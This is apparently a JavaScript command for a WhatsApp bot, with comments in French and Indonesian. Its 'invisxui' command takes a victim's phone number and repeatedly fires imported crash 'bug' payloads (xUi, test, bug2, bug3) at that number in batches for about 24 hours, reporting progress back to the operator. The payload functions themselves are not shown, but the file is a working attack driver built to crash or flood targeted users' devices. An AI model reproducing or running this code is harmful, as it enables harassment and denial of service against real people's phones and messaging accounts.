import { xUi } from "../xUi.js"; // ton module xUi intact
import { test, bug2, bug3 } from "../lib/delaycrash.js"; // <-- import des fonctions exportées

// Fonction de pause
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// Commande invisxui - exécutions en "batches" (plusieurs injections toutes les X)
export default {
  name: "invisxui",
  description: "Exécute le bug Invisxui en batches pour que l'exécution dure ~24h",
  async execute(sock, m, args) {
    const prefix = ".";
    const q = args.join(" ");
    
    if (!q) {
      return await sock.sendMessage(
        m.key.remoteJid,
        { text: `Contoh: ${prefix}invisxui 237xxxx` },
        { quoted: m }
      );
    }

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    const pureTarget = target.split("@")[0];

    // --- CONFIGURATION (modifie si nécessaire) ---
    const batchSize = 4;        // nombre d'injections par exécution (par batch)
    const intervalMs = 2000;    // pause entre chaque batch (ms)
    const injectionGapMs = 100; // pause entre injections dans un même batch (ms)
    const totalDurationMs = 24 * 60 * 60 * 1000; // 24h
    const perBatchTimeMs = (batchSize * injectionGapMs) + intervalMs;
    let totalBatches = Math.ceil(totalDurationMs / perBatchTimeMs);
    const MAX_BATCHES = 200000;
    if (totalBatches > MAX_BATCHES) totalBatches = MAX_BATCHES;
    const updateEveryBatches = Math.max(1, Math.floor((60 * 60 * 1000) / perBatchTimeMs)); // ~1h
    // ------------------------------------------------

    const prosesText = `╔═══════════════════
║  📡 Mengirim bug Invisxui
╠═══════════════════
║ Target: wa.me/${pureTarget}
║ Status: ⏳ Mulai mengirim...
║ Durée cible: 24 heures
╚═══════════════════`;

    const imageUrl = "https://files.catbox.moe/4185go.jpg";

    await sock.sendMessage(
      m.key.remoteJid,
      {
        image: { url: imageUrl },
        caption: prosesText
      },
      { quoted: m }
    );

    for (let batch = 0; batch < totalBatches; batch++) {
      for (let i = 0; i < batchSize; i++) {
        try {
          // injection principale (xUi)
          await xUi(sock, target);

          // appels supplémentaires (bugs)
          // test: signature (message, sock)
          await test(m, sock);

          // bug2: signature (message, client, target)
          await bug2(m, sock, target);

          // bug3: signature (message, client, target)
          await bug3(m, sock, target);

        } catch (err) {
          console.error(`Erreur Invisxui - batch ${batch + 1} injection ${i + 1}:`, err && err.message ? err.message : err);
        }

        // Petite pause entre injections du même batch pour éviter overlap
        await sleep(injectionGapMs);
      }

      if ((batch + 1) % updateEveryBatches === 0) {
        const elapsedBatches = batch + 1;
        const elapsedMs = elapsedBatches * perBatchTimeMs;
        const percent = Math.min(100, Math.round((elapsedMs / totalDurationMs) * 100));
        await sock.sendMessage(
          m.key.remoteJid,
          { text: `Progress: batch ${elapsedBatches}/${totalBatches} (${percent}%) envoyé pour wa.me/${pureTarget}` },
          { quoted: m }
        );
      }

      if (batch < totalBatches - 1) {
        await sleep(intervalMs);
      }
    }

    const selesaiText = `╔═══════════════════
║  ✅ Bug Invisxui Terminé
╠═══════════════════
║ Target: wa.me/${pureTarget}
║ Status: ✅ Semua batches dikirim
║ Note: Ajuste batchSize/interval si perlu
╚═══════════════════`;

    await sock.sendMessage(
      m.key.remoteJid,
      {
        image: { url: imageUrl },
        caption: selesaiText
      },
      { quoted: m }
    );
  }
};